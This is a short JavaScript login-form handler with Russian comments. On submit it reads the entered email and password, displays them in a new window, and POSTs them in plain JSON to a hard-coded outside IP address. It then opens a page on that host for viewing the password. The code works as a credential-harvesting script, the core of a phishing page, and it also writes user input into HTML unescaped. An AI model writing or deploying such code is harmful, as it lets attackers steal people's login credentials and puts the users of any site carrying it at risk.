document.getElementById('loginForm').addEventListener('submit', function(event) {
    event.preventDefault();
    const email = document.getElementById('email').value;
    const password = document.getElementById('password').value;

    // Открываем новое окно с введенными данными
const newWindow = window.open('', '_blank');
newWindow.document.write(`
        <!DOCTYPE html>
        <html lang="ru">
        <head>
            <meta charset="UTF-8">
            <meta name="viewport" content="width=device-width, initial-scale=1.0">
            <title>Введенные данные</title>
            <style>
                body {
                    font-family: Arial, sans-serif;
                    background-color: #f5f5f5;
                    display: flex;
                    justify-content: center;
                    align-items: center;
                    height: 100vh;
                    margin: 0;
                }
                .container {
                    background-color: white;
                    padding: 20px;
                    border-radius: 8px;
                    box-shadow: 0 2px 10px rgba(0, 0, 0, 0.1);
                    width: 350px;
                }
                h1 {
                    font-size: 24px;
                    margin-bottom: 20px;
                    text-align: center;
                }
                p {
                    font-size: 16px;
                    margin-bottom: 10px;
                }
            </style>
        </head>
        <body>
            <div class="container">
                <h1>Введенные данные</h1>
                <p><strong>Электронная почта или телефон:</strong> ${email}</p>
                <p><strong>Пароль:</strong> ${password}</p>
            </div>
        </body>
        </html>
    `);
newWindow.document.close();

    // Отправляем данные на другой компьютер
    fetch('http://213.230.74.127:3000', {
        method: 'POST',
        headers: {
            'Content-Type': 'application/json',
        },
        body: JSON.stringify({ email, password }),
    })
    .then(response => response.json())
    .then(data => console.log('Success:', data))
    .catch((error) => console.error('Error:', error));

    // Открываем ссылку для просмотра пароля на другом компьютере
    window.open('http://213.230.74.127:3000/password', '_blank');
});